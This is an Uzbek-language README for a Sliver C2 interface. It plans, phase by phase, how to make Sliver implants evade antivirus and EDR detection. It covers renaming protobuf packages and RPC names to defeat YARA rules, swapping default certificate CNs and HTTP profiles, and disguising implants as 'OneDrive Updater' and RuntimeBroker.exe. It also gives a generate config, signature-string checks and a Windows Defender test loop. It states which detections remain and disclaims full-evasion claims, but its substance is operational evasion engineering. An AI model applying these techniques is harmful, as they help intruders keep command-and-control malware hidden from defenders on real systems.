# AV qatlamlarini yopish — reja (README)

> Holat: **Faza 0–3 kodga tushgan.** Faza 4–5 va keyingi ishlar shu hujjatda qoldiriladi — implementatsiya keyinroq.
>
> Tadqiqot: [`reports/AV detection of Sliver implants.md`](../reports/AV%20detection%20of%20Sliver%20implants.md) · [`.uz.md`](../reports/AV%20detection%20of%20Sliver%20implants.uz.md)
>
> Oldingi loader reja: [`LOADER_AV_OPSEC_PLAN.md`](./LOADER_AV_OPSEC_PLAN.md) (Faza 0–6 loader stack — bajarilgan).

Bu hujjat **ommaviy, iqtibos qilingan** AV/EDR detektorlarini yopish yo‘lini tartiblaydi. FUD / VT 0/70 / «Defender o‘chirildi» da’volari yo‘q.

---

## Yopilgan deb nima hisoblanadi

Qatlam **yopiladi** qachonki shu qatlamdagi ommaviy detektor default generate+wrap (shu UI + bundled patched `sliver-server`) ni ushlamasa.

**Shift (ceiling)** — UI checkbox yopmaydi:

- `Behavior:Win32/CommandAndControl.*!ml`
- PAN ATP 89961 (TLS 1.3 sequence net)
- Elastic / Crowdstrike / SentinelOne unpublished ML
- Go implantning o‘zidagi `gopclntab` / PE-ML (C wrap faqat stub)
- Post-ex CRT inject telemetriyasi (`VirtualAllocEx` → `WriteProcessMemory` → `VirtualProtectEx` → `CreateRemoteThread`)
- Sleep mask (stock Sliverda yo‘q; Go runtime)

Labda Protection History **1116 Name** qaysi qatlam qolganini aytadi. Name ommaviy IOC ga mos kelsa — mos fazaga qaytish. Name unpublished ML bo‘lsa — to‘xtash, FUD yozmaslik.

### Qilinmaydi

in-tree Donut/ScareCrow · AMSI/ETW patch default · FUD/VT widget · UnDefend/BYOVD · implantni C da qayta yozish · origin (`9Insomnie`) ga push · generate interval unitlarini o‘zgartirish · live CA ni operator cfg ni sindirib aylantirish (ixtiyoriy `--rotate-ca` alohida)

---

## Operator yo‘li (maqsad)

```text
1. Listeners: HTTPS (443 yoki yuqori port) + HTTP C2 profile ≠ default (masalan ms-update)
2. Implants: windows/amd64 · format=shared · polymorph on · HTTP profile = ms-update
3. Loaders: disk LoadLibrary → C EXE + yonma-yon DLL (MEM_IMAGE)
4. Lab: EXE+DLL bir papkada ishga tushirish
5. Yozish: sessiya umri · 1116/1015/1117 Name · C2 host:port
```

`format=shellcode` + C PIC (`VirtualAlloc`) — Unbacked yo‘l; advanced / Linux. Default emas.

---

## Olti qatlam — joriy holat

| # | Qatlam | Ommaviy IOC | Kod holati | Qolgan |
|---|---|---|---|---|
| 1 | Disk oila YARA | RPC nomlari, `bishopfox`, COM/`VoidFunc`, `Go buildinf:`, Donut AMSI stub | RPC morph, Donut Bypass=1, StartW-only + random export, branding clean, default `shared` | Generate artifact smoke (Faza 4) |
| 2 | Go PE-ML | `Wacatac` / `gopclntab` | C wrap stub yopadi | Implant DLL/EXE ~16–30 MB Go — **shift** |
| 3 | Xotira YARA | Immersive `sliverpb`; Elastic RPC + bytecode | Package `sliverpb`→`cpmfczjv`, `dnspb`→`pnwlb`; rawDesc hex ham; RPC `GetJitter`→`WgzBgfnsl` | Generate DLL da string smoke; sleep mask — ixtiyoriy spike |
| 4 | ETW-Ti / Unbacked | Unbacked `LoadLibraryExW` winhttp; ALLOCVM/PROTECTVM | Disk LoadLibrary default yo‘l; Donut Bypass=1 | PIC wrap hali Unbacked — default qilmaslik |
| 5 | Behavior / post-ex | CRT + `notepad.exe`/`spoolsv`; psexec `Sliver`; C2 ML | PsExec OneDrive defaults; RuntimeBroker placeholder; CRT warn i18n | CRT o‘zi — **shift**; 1116 lab |
| 6 | Tarmoq | `.woff/.js/.php`; `CN=multiplayer` / `O=operators` | Generate `default` profil **400**; yangi install CA `workgroup`/`application` | Live serverda `ms-update` ni save; live CA aylantirish ixtiyoriy |

### Jonli seed / mapping (v1.7.3 bundled)

| Stock | Morph (seed `a1b2c3d4e5f60718a1b2c3d4e5f60718`) |
|---|---|
| `GetJitter` | `WgzBgfnsl` |
| `sliverpb` (package + rawDesc) | `cpmfczjv` |
| `dnspb` | `pnwlb` |

Operator profil: `sliverui`. Data dir: `~/.sliver`. Unit: `User=cup`, `ExecStart=.../bin/sliver-server daemon`.

Rebuild: `bash scripts/build-sliver-server.sh` ( `-needles` + `-proto-pkg` ), keyin `cd backend && go build -o ../sliver-ui .`, binarylarni `~/.local/share/sliver-ui/bin/` ga nusxa, `systemctl restart sliver sliver-ui`.

---

## Bajarilgan fazalar (qisqa)

### Faza 0 — default yo‘l ✅

- Windows generate default `format=shared`
- HTTP/HTTPS `http_c2_profile=default` → API **400** + UI blok
- `ms-update` template (`frontend/src/lib/httpC2Templates.ts`) — ro‘yxatda yo‘q bo‘lsa save urinish
- PsExec bo‘sh metadata → `OneDrive Updator` / OneDrive description
- Loaders: disk LoadLibrary = MEM_IMAGE; RDI = Unbacked PIC (i18n)

### Faza 1 — `sliverpb` package ✅

- `sliverpatch -proto-pkg`: stock ignalar, substring + **hex rawDesc** (`0x73,0x6c,…`)
- Katalog rename `protobuf/sliverpb` → `protobuf/cpmfczjv`
- Server binary smoke: `strings sliver-server | rg sliverpb` → **0**
- UI lockstep (`go.mod replace` → `third_party/sliver`)

### Faza 2 — tarmoq (qisman) ✅

- Generate tomonda `default` o‘ldirilgan
- Generator patch: yangi CA CN `operators`→`workgroup`, mtls `multiplayer`→`application` (**yangi** `~/.sliver` uchun; live CA saqlangan)
- GetSystem nil-guard profil nomi `ms-update`

**Qolgan (Faza 5 oldidan):** teamserverda `ms-update` profilini haqiqatan save qilish (oxirgi inventarda faqat `['default']` ko‘rindi).

### Faza 3 — post-ex defaults ✅

- Advanced placeholder `RuntimeBroker.exe`, CRT ogohlantirish (en+zh)
- Generator: CLI `notepad.exe` → `RuntimeBroker.exe`
- PsExec stock `Sliver` / `Sliver implant` backendda olib tashlangan

---

## Faza 4 — generate artifact string smoke

**Maqsad:** patched serverdan chiqqan `shared` DLL da ommaviy ignalar yo‘qligini avtomatik tekshirish (Defender detonatsiyasisiz).

### Qilish

1. HTTPS listener (yuqori port yoki `setcap cap_net_bind_service=+ep` on `sliver-server` for :443).
2. `POST /api/http-c2-profiles` — `ms-update` (overwrite=false).
3. Generate:

```json
{
  "name": "OneDriveUpdater_lab",
  "os": "windows",
  "arch": "amd64",
  "format": "shared",
  "polymorph": true,
  "obfuscate": true,
  "c2": [{ "address": "<host>:<port>", "protocol": "https" }],
  "http_c2_profile": "ms-update"
}
```

4. Loaders → disk LoadLibrary → EXE + DLL.
5. Smoke (DLL va/yoki EXE):

| Igna | Kutilgan |
|---|---|
| `sliverpb` | 0 |
| `GetJitter` / `ScreenshotReq` / `HTTPSessionInit` | 0 |
| `bishopfox` / `BishopFox` | 0 (branding/garble) |
| `VoidFunc` / `DllRegisterServer` | 0 |
| `Go buildinf:` | 0 (clean) |
| Donut AMSI stub / `B8 57 00 07 80` sinfi | 0 (shared, Bypass=1) |
| `cpmfczjv` / `WgzBgfnsl` | bo‘lishi mumkin (morph) — oila YARA emas |

6. CI yoki `go test` / kichik script: needles fail → qizil.

**Tekshiruv:** smoke yashil; `clean.remaining` patched generate da stock oila satrlari bo‘sh.

**Fayllar (taxmin):** `backend/internal/loader/implant_clean_test.go` uslubida yangi test yoki `scripts/smoke-implant-strings.sh`.

---

## Faza 5 — Windows 11 + Defender lab loop

**Maqsad:** 1116 Name bilan yopilishni tasdiqlash yoki shift ni qayd etish.

### Muhit talabi

| Talab | Izoh |
|---|---|
| Windows 11 | Inbox MDAV, cloud protection yoqilgan |
| Lab host | Bu Linux mashinada virsh/VBox inventarda Windows VM **yo‘q** edi; wine bor — **1116 bermaydi** |
| C2 | HTTPS listener; cup uchun :443 → `setcap` yoki port ≥1024 |
| Artifact | Faza 4 dagi `shared` + disk LoadLibrary juftligi |

### Qadamlar

1. **C2**
   - UI → HTTP C2 → `ms-update` ni serverga Save.
   - Listeners → HTTPS `0.0.0.0:<port>` (labda VM dan yetadigan IP).
2. **Generate** — Faza 4 config (shared, polymorph, `ms-update`).
3. **Wrap** — Loaders → Build EXE; EXE + DLL ni bir papkaga.
4. **Transfer** — lab Windows ga (SMB/HTTP; MotW ni bilgan holda).
5. **Run** — EXE ni ishga tushirish (DLL yonida).
6. **Yozish**

| Maydon | Qiymat |
|---|---|
| Sana / build SHA-256 | |
| format / engine | shared + mingw-c-dll |
| HTTP C2 profile | ms-update |
| Listener | host:port |
| Sessiya ochildimi | ha / yo‘q |
| Jarayon umri | |
| Event 1015 | |
| Event 1116 Name | |
| Event 1117 action | |
| Protection History Name | |

### Qaror daraxti

```text
1116 yo‘q + sessiya turadi
  → qatlam 1/3/4 ommaviy qismi labda yopiq
  → shift (2, 5 unpublished, CRT) qoladi — FUD yo‘q

1116 Name ∈ {oilа YARA, sliverpb, AMSI_Patch, Wacatac stub, …}
  → mos fazaga qaytish (4 yoki generator)

1116 Name ∈ {Behavior:Win32/CommandAndControl.*, unpublished}
  → shift; to‘xtash; Name ni reportga yozish
```

### Wine (ixtiyoriy, 1116 emas)

`wine64 OneDriveUpdater.exe` — load/xato tekshiruvi. MDAV Protection History yo‘q. Natijani «Defender clean» deb yozmaslik.

### Lab checklist fayli (keyinroq)

`reports/AV Faza 5 lab.md` — har bir uranish uchun jadval + Name. Hozircha shu README yetarli.

---

## Faza 6+ — keyingi ishlar (ixtiyoriy / shift)

Ular «to‘liq FUD» emas; tadqiqot shift qatlamiga tegadi yoki ops qulayligi.

### 6a. Live `ms-update` + listener UX

- Birinchi login/generate oldidan `ms-update` ni serverda kafolatlash (Faza 0 urinishi RPC rad etgan bo‘lishi mumkin).
- Listeners sahifasida HTTPS + tavsiya etilgan profile ogohlantirishi.
- :443 uchun install hujjatida `setcap` yoki reverse-proxy.

### 6b. `--rotate-ca` (ixtiyoriy)

Yangi `workgroup`/`application` CN ni live `~/.sliver` ga o‘tkazish: CA ni qayta chiqarish, `sliverui` operator cfg ni qayta issue, UI `--profile` yangilash. **Eski implantlar va cfg lar sinadi.**

### 6c. String smoke CI (Faza 4 avtomatlashtirish)

Har `make sliver-server` yoki nightly: kichik `shared` generate (yoki fixture DLL) + needles assert. Disk/time og‘ir — ixtiyoriy.

### 6d. Sleep mask spike (kafolatsiz)

Fortbridge: stock daraxtida sleep mask yo‘q. Go runtime + protobuf resident. Spike: idle da xotirani encrypt qilish tadqiqoti; default yo‘lga qo‘ymaslik.

### 6e. Post-ex sacrificial / rwxPages

Implant `taskrunner` da notepad o‘rniga sozlanadigan host process; `rwxPages` default false. CRT ketma-ketligi baribir EDR da — faqat ommaviy nom IOC.

### 6f. Linux string smoke

ELF `shared`/`executable`: Immersive `sliverpb` endi morph. Unbacked-network-DLL qoidasi Windows. `/proc` map YARA — Faza 4 ignalari bilan.

### 6g. Hujjat / UI banner

Settings yoki Loaders da qisqa banner (en+zh):

- Yopilgan: ommaviy YARA, Unbacked-network-module (disk LoadLibrary), default-HTTP URI.
- Qoladi: Go PE-ML implant, ETW-Ti, unpublished C2 ML, post-ex CRT.

### 6h. Qilinmaydigan «keyingi»

Native C implant · BYOVD · default AMSI patch · ScareCrow in-tree · VT score widget · origin push

---

## Tekshiruvlar (qisqa)

| Qachon | Nima |
|---|---|
| Har generator o‘zgarish | `go test ./internal/sliverfork/ ./internal/sliver/` |
| i18n | `npx vitest run src/i18n/__tests__/i18n.test.ts` |
| Server binary | `strings sliver-server \| rg -c sliverpb` → 0; `WgzBgfnsl` / `cpmfczjv` > 0 |
| UI↔server | login + `GET /api/jobs` 200 |
| Generate | `http_c2_profile=default` → 400 |
| Faza 5 | 1116 Name jadvali |

---

## Bog‘liqlik

```text
Faza 0–3 ✅
    │
    ▼
Faza 4  string smoke (generate artifact)
    │
    ▼
Faza 5  Windows 11 + Defender 1116
    │
    ├─ Name ommaviy IOC → tegishli fazaga qaytish
    └─ Name unpublished / sessiya turadi → shift qayd + to‘xtash

Faza 6a–6g  ixtiyoriy ops / shift yumshatish (FUD emas)
```

---

## Tezkor buyruqlar

```bash
# Patched server + UI rebuild
export GOCACHE=/tmp/go-cache-sliver
bash scripts/build-sliver-server.sh
cd frontend && npm run build
cd .. && rm -rf backend/web/dist && mkdir -p backend/web/dist && cp -r frontend/dist/* backend/web/dist/
cd backend && go build -o ../sliver-ui .
cp -f ../sliver-server ../sliver-ui ../sliver-client ~/.local/share/sliver-ui/bin/
systemctl restart sliver.service sliver-ui.service

# Proto smoke (server)
strings ~/.local/share/sliver-ui/bin/sliver-server | rg -c 'sliverpb|GetJitter|cpmfczjv|WgzBgfnsl'
```

---

## Xulosa

Kod tomonda ommaviy oila YARA / package path / default HTTP / disk LoadLibrary yo‘li yopilgan. **Lab tasdiqlash (Faza 5) va generate string smoke (Faza 4) qolgan.** Shift qatlamlari (Go PE-ML implant, unpublished C2 ML, CRT) yopilmaydi — shu README shu chegarani eslatib turadi.
